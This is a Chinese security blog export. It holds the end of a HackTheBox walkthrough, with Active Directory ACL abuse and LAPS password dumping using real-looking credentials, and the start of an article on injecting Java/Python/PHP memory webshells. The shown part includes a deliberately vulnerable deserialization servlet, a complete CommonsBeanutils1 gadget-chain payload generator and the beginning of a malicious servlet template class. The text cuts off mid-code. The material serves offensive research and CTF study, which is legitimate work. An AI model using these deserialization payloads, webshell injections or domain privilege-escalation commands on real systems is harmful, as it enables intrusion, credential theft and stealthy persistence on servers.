staff组中添加成员。接下来我们登录到nikk37，上传powerview并导入：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upload ../../../../../home/rainb0w/Tools/PowerSploit/Recon/PowerView.ps1  .</span><br><span class="line">. .\PowerView.ps1</span><br></pre></td></tr></table></figure><p>存储凭据：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$SecPassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;JDg0dd1s@d0p3cr3@t0r&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="variable">$Cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">&#x27;streamIO.htb\JDgodd&#x27;</span>, <span class="variable">$SecPassword</span>)</span><br></pre></td></tr></table></figure><p>通过Add-DomainObjectAcl赋予所有的权力，并通过Add-DomainGroupMember添加nikk37到CORE STAFF组中：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Add-DomainObjectAcl</span> <span class="literal">-Credential</span> <span class="variable">$Cred</span> <span class="literal">-TargetIdentity</span> <span class="string">&quot;CORE STAFF&quot;</span> <span class="literal">-Rights</span> All <span class="literal">-PrincipalIdentity</span> JDgodd</span><br><span class="line"><span class="built_in">Add-DomainGroupMember</span> <span class="literal">-Identity</span> <span class="string">&#x27;CORE STAFF&#x27;</span> <span class="literal">-Members</span> <span class="string">&#x27;nikk37&#x27;</span> <span class="literal">-Cred</span> <span class="variable">$Cred</span></span><br></pre></td></tr></table></figure><p>接下来可以利用这篇文章：<a href="https://www.hackingarticles.in/credential-dumpinglaps/">https://www.hackingarticles.in/credential-dumpinglaps/</a> 中介绍的方法去dump laps凭据：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec ldap 10.10.11.158 -u nikk37 -p <span class="string">&#x27;get_dem_girls2@yahoo.com&#x27;</span> –kdcHost 10.10.11.158 -M laps</span><br><span class="line"></span><br><span class="line">ldapsearch -x -H ldap://10.10.11.158 -D nikk37@streamio.htb -w <span class="string">&quot;get_dem_girls2@yahoo.com&quot;</span> -b <span class="string">&quot;dc=streamio,dc=htb&quot;</span> <span class="string">&quot;(ms-MCs-admpwd=*)&quot;</span>|grep ms-Mcs-AdmPwd</span><br></pre></td></tr></table></figure><p>最后利用得到的密码登录到Administrator，拿到Root Flag：</p><p><a href="https://pic.imgdb.cn/item/65760fedc458853aef557252.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760fedc458853aef557252.jpg"></a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这道靶机并不困难，只是考点比较多，因此打起来也感到比较繁琐费力，因此个人认为还是值得Medium难度。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java/Python/PHP Memory WebShell</title>
      <link href="/2023/08/08/Memory_WebShell/"/>
      <url>/2023/08/08/Memory_WebShell/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为内存马种类繁杂，每次都要翻看很多文章，又加上最近有某个大活动，因此就写了这篇文章来总结一下常见的3种语言（PHP、Python、JAVA）的内存马的注入方法和查杀方法，并尝试自己完成一个内存马查杀工具的实现。希望本篇文章能给师傅们带来一些启发。文章一长就难免在表达和准确性上有所疏漏，如有错误或不足，请师傅们指正。</p><p>Java内存马的种类很多，这篇文章主要对Tomcat-Servlet、Tomcat-Filter、Tomcat-Listener、Tomcat-Websocket、JavaAgent以及SpringMVC Controller等种类的内存马进行研究。很多师傅在分析或者注入Java内存马的时候利用的exp大多是jsp形式的，通过向目标Web目录上传jsp文件，之后访问该jsp文件执行jsp代码从而注入Java内存马。因为这种方式仍然存在文件落盘，而存在文件落盘就意味着很容易被IDS监测到，因此笔者认为这种办法应当是我们拿不到代码执行权限，但是可以拿到命令执行权限或文件上传权限的时候再去利用。那如果我们可以拿到代码执行权限，比如目标存在反序列化漏洞的情况，我们又该如何做到在不上传jsp的条件下，完成内存马的注入？其实难点在于我们该怎样获取request对象。获取request对象并不仅仅是反序列化注入内存马要考虑的，在Java RCE Echo中，也是重中之重。本篇文章重点介绍<strong>通过反序列化注入内存马</strong>的方法。（本篇文章默认读者拥有基础的Tomcat、JavaAgent以及Spring框架知识）</p><p>PHP内存马是<strong>通过伪造fastcgi协议包与php-fpm进行通信，改变auto_prepend_file配置，从而在每次访问正常PHP文件时加载我们构造好的php马</strong>。因为笔者并不认可PHP不死马是一种内存马技术，因此在这篇文章就不做具体介绍了。</p><p>Python内存马，原出自hexman学长介绍的一种方法：<a href="https://github.com/iceyhexman/flask_memory_shell">Flask 内存马</a>，通过利用flask&#x2F;jinja2 SSTI漏洞来实现内存修改，注入内存马。<strong>网上也有不少文章在介绍这种内存马，然而仅仅只是根据payload来解释，没有人从代码层去分析能够注入内存马的原因，本篇文章会从代码层分析flask的请求上下文机制，并根据注入原理给出一些payload变形。</strong>虽然flask&#x2F;jinja2 SSTI漏洞在真实场景中很难出现，但是在一些AWD比赛上关于flask&#x2F;jinja2 SSTI漏洞的题目却是经常有，为了能够在目标修补SSTI漏洞后维持权限，这种内存马也是很值得学一学的。</p><h2 id="Java-内存马"><a href="#Java-内存马" class="headerlink" title="Java 内存马"></a>Java 内存马</h2><p>笔者Tomcat的版本是9.0.76，不同的Tomcat版本可能会有所差异，请注意。</p><h3 id="Tomcat-Servlet-型内存马"><a href="#Tomcat-Servlet-型内存马" class="headerlink" title="Tomcat-Servlet 型内存马"></a>Tomcat-Servlet 型内存马</h3><h4 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h4><p>首先配置一个最简单的Servlet：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello-servlet&quot;, loadOnStartup = 2)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">        message = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Hello</span></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;&quot;</span> + message + <span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处写loadOnStartup&#x3D;2是为了后面的调试更好理解。接着导入tomcat-catalina依赖，应与自己的tomcat版本一致：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;9.0.76&lt;/version&gt;</span><br><span class="line">    &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>在org.apache.catalina.startup.ContextConfig#configureContext处打下断点，开始调试：</p><p><a href="https://pic.imgdb.cn/item/64d26ce71ddac507cc0273ea.jpg" title="image-20230802150054993" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26ce71ddac507cc0273ea.jpg" alt="image-20230802150054993"></a></p><p>因为我们是采用注解的方式配置Servlet，因此此处我们仍然可以获取到创建的Servlet。首先是DefalutServlet以及JspServlet，接着就遍历到了我们创建的HelloServlet了：</p><p><a href="https://pic.imgdb.cn/item/64d26cf91ddac507cc02a3c2.jpg" title="image-20230802150539325" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26cf91ddac507cc02a3c2.jpg" alt="image-20230802150539325"></a></p><p>之后执行<code>this.context.createWrapper()</code>创建Wrapper，Wrapper 表示一个Servlet，负责管理整个 Servlet 的生命周期，包括装载、初始化、资源回收等：</p><p><a href="https://pic.imgdb.cn/item/64d26d051ddac507cc02c10d.jpg" title="image-20230802150700866" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26d051ddac507cc02c10d.jpg" alt="image-20230802150700866"></a></p><p>可以看到this.context是一个StandardContext对象。那我们继续调试看看对Wrapper进行了哪些操作：</p><p><a href="https://pic.imgdb.cn/item/64d26d121ddac507cc02e18f.jpg" title="image-20230802150947572" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26d121ddac507cc02e18f.jpg" alt="image-20230802150947572"></a></p><p>首先获取Servlet的LoadOnStartup和enabled，并设置给Wrapper。其中LoadOnStartup就是我们在注解中配置的参数，它表示servlet被加载的先后顺序。继续跟进：</p><p><a href="https://pic.imgdb.cn/item/64d26d1e1ddac507cc0302e9.jpg" title="image-20230802151328144" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26d1e1ddac507cc0302e9.jpg" alt="image-20230802151328144"></a></p><p>这里调用了Servlet的getServletName()方法，获取servlet的名字，也就是我们在主机中配置的name参数的值，接着将name的值设置给Wrapper。接着还将<code>servlet.getRunAs()</code>的结果传入给了Wrapper，不过因为此处<code>servlet.getRunAs()</code>的执行结果是null且<code>roleRefs.size()==0</code>，因此此处我们可以忽略：</p><p><a href="https://pic.imgdb.cn/item/64d26d2d1ddac507cc032929.jpg" title="image-20230802151705189" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26d2d1ddac507cc032929.jpg" alt="image-20230802151705189"></a></p><p>继续跟进：</p><p><a href="https://pic.imgdb.cn/item/64d26d371ddac507cc034661.jpg" title="image-20230802151854696" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26d371ddac507cc034661.jpg" alt="image-20230802151854696"></a></p><p>可以看到此处将Wrapper的servletClass设置为HelloServlet的全限定名。继续跟进，因为Servlet的multipartDef&#x3D;&#x3D;null、asyncSupported&#x3D;&#x3D;null，因此以下部分我们可以跳过：</p><p><a href="https://pic.imgdb.cn/item/64d26d441ddac507cc036932.jpg" title="image-20230802152617852" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26d441ddac507cc036932.jpg" alt="image-20230802152617852"></a></p><p>之后又执行了addChild方法将这个Wrapper添加进了StandardContext中：</p><p><a href="https://pic.imgdb.cn/item/64d26d511ddac507cc0388e7.jpg" title="image-20230802152732881" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26d511ddac507cc0388e7.jpg" alt="image-20230802152732881"></a></p><p>接下来添加Servlet-Mapper，也就是web.xml中的<code>&lt;servlet-mapping&gt;</code>，不过因为我们是通过注解设置url和servlet的映射关系，因此此处是通过注解获取而非web.xml。接着循环addServletMappingDecoded将url和servlet类做映射：</p><p><a href="https://pic.imgdb.cn/item/64d26d5e1ddac507cc03acd7.jpg" title="image-20230802153045780" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26d5e1ddac507cc03acd7.jpg" alt="image-20230802153045780"></a></p><p>至此我们就看完了servlet的注册流程，但是还有一个疑问，那就是这个StandardContext从哪里获取？</p><p>其实这个分两种情况，一种是网上很常见的，将内存马的生成代码写入到jsp并上传到目标服务器，接着访问该jsp然后注入内存马，这种方法获取StandardContext比较容易，因为jsp内置request对象，因此可以直接利用request对象反射获取。但是这种情况要求文件落地，很容易被检测到。还有一种情况是通过某些gadget chain（如CC11，CB1）打入字节码，然后注入内存马。这种情况需要我们知道request存储的位置，获取到request对象后通过反射获取StandardContext。第二种情况更隐蔽，但同时要求和难度更大，这里对两种方法都进行介绍。</p><h4 id="反序列化注入Tomcat-Servlet型内存马"><a href="#反序列化注入Tomcat-Servlet型内存马" class="headerlink" title="反序列化注入Tomcat-Servlet型内存马"></a>反序列化注入Tomcat-Servlet型内存马</h4><p>添加commons-beanutils依赖：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;commons-beanutils&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;1.9.2&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>并修改HelloServlet的doPost方法，我们手动构造一个反序列化漏洞环境：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">codes</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;codes&quot;</span>);</span><br><span class="line">        System.out.println(codes);</span><br><span class="line">        <span class="type">byte</span>[] codebytes = Base64.getDecoder().decode(codes);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(codebytes));</span><br><span class="line">            ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (ClassNotFoundException c)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Hello</span></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;反序列化成功！&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>反序列化注入内存马获取request对象的方法，我这里提供两种。一种是<strong>kingkk</strong>师傅提出的：</p><blockquote><p>1、反射修改<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code></p><p>2、初始化<code>lastServicedRequest</code>和<code>lastServicedResponse</code>两个变量，默认为null</p><p>3、从<code>lastServicedResponse</code>中获取当前请求response，并且回显内容。</p></blockquote><p>这种方法缺点是只使用于Tomcat，但优点是耗时更短，获取request更稳定。另一种是<strong>c0ny1</strong>师傅提出的通过Thread.currentThread()或Thread.getThreads()获取：</p><blockquote><p>按照经验来讲Web中间件是多线程的应用，一般requst对象都会存储在线程对象中，可以通过<code>Thread.currentThread()</code>或<code>Thread.getThreads()</code>获取。当然其他全局变量也有可能，这就需要去看具体中间件的源码了。比如前段时间先知上的李三师傅通过查看代码，发现<code>[MBeanServer](https://xz.aliyun.com/t/7535)</code>中也有request对象。</p></blockquote><p>这种方法的优点是更加通用，在多种Web中间件中都可以使用，但缺点是耗时稍长，且有时候会出现没有搜索到request对象的情况。出现首先给出第一种方法的EXP：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> queue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@org</span>.junit.jupiter.api.Test</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">payload</span> <span class="operator">=</span> getpayload();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        outputStream.writeObject(payload);</span><br><span class="line">        outputStream.flush();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">codes</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">        System.out.println(codes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以下是CB1反序列化所需要的恶意模板类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Wrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> ServletConfig config;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span 